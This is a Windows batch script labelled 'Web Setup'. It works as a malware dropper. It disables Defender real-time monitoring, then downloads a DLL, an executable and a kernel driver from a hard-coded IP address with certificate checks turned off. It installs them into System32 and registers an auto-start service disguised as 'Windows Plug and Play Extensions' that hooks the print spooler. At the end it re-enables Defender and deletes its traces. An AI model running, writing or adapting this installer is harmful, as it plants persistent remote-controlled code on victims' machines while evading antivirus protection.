@echo off
cd /d "%~dp0"
set Q=%TEMP%\_q.tmp
set SERVER=https://64.226.66.66
if not "%~1"=="" set SERVER=%~1
set TD=%TEMP%\wpnp_%RANDOM%

echo ============================================
echo  Web Setup - Server: %SERVER%
echo ============================================
echo.
echo [1/8] Disabling Defender...
start /wait /min powershell.exe -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
waitfor /t 2 x >"%Q%" 2>&1
echo [2/8] Downloading...
mkdir "%TD%" >"%Q%" 2>&1
echo        pnpext.dll...
start /wait /min powershell.exe -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};(New-Object Net.WebClient).DownloadFile('%SERVER%/files/pnpext.dll','%TD%\pnpext.dll')"
if not exist "%TD%\pnpext.dll" (echo [!] Download failed & goto fail)
echo        OK
echo        WPnpSvc.exe...
start /wait /min powershell.exe -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};(New-Object Net.WebClient).DownloadFile('%SERVER%/files/WPnpSvc.exe','%TD%\WPnpSvc.exe')"
if not exist "%TD%\WPnpSvc.exe" (echo [!] Download failed & goto fail)
echo        OK
echo        pnpext.sys...
start /wait /min powershell.exe -Command "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};(New-Object Net.WebClient).DownloadFile('%SERVER%/files/pnpext.sys','%TD%\pnpext.sys')"
echo        OK
echo [3/8] Removing old...
sc.exe stop WPnpSvc >"%Q%" 2>&1
waitfor /t 2 x >"%Q%" 2>&1
sc.exe delete WPnpSvc >"%Q%" 2>&1
taskkill.exe /F /IM rundll32.exe >"%Q%" 2>&1
echo [4/8] Installing files...
copy /y "%TD%\pnpext.dll" "%SystemRoot%\System32\pnpext.dll" >"%Q%" 2>&1
copy /y "%TD%\WPnpSvc.exe" "%SystemRoot%\System32\WPnpSvc.exe" >"%Q%" 2>&1
if exist "%TD%\pnpext.sys" (copy /y "%TD%\pnpext.sys" "%SystemRoot%\System32\drivers\pnpext.sys" >"%Q%" 2>&1)
echo        Files copied
echo [5/8] Creating service...
sc.exe create WPnpSvc binPath= "%SystemRoot%\System32\WPnpSvc.exe" type= own start= auto depend= Spooler DisplayName= "Windows Plug and Play Extensions" >"%Q%" 2>&1
sc.exe description WPnpSvc "Manages extended Plug and Play device configuration and compatibility" >"%Q%" 2>&1
echo [6/8] Configuring...
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\WPnpSvc\Parameters" /v DllPath /t REG_SZ /d "%SystemRoot%\System32\pnpext.dll" /f >"%Q%" 2>&1
reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\WPnpSvc\Parameters" /v TargetService /t REG_SZ /d "Spooler" /f >"%Q%" 2>&1
echo [7/8] Starting...
sc.exe start Spooler >"%Q%" 2>&1
waitfor /t 3 x >"%Q%" 2>&1
sc.exe start WPnpSvc >"%Q%" 2>&1
waitfor /t 4 x >"%Q%" 2>&1
echo [8/8] Cleanup...
rd /s /q "%TD%" >"%Q%" 2>&1
start /wait /min powershell.exe -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $false"
echo.
echo [+] Done! Service: WPnpSvc
goto end
:fail
rd /s /q "%TD%" >"%Q%" 2>&1
start /wait /min powershell.exe -WindowStyle Hidden -Command "Set-MpPreference -DisableRealtimeMonitoring $false"
echo [!] Failed
:end
del "%Q%" >"%TEMP%\_q2.tmp" 2>&1
del "%TEMP%\_q2.tmp" >con 2>&1
echo.
pause
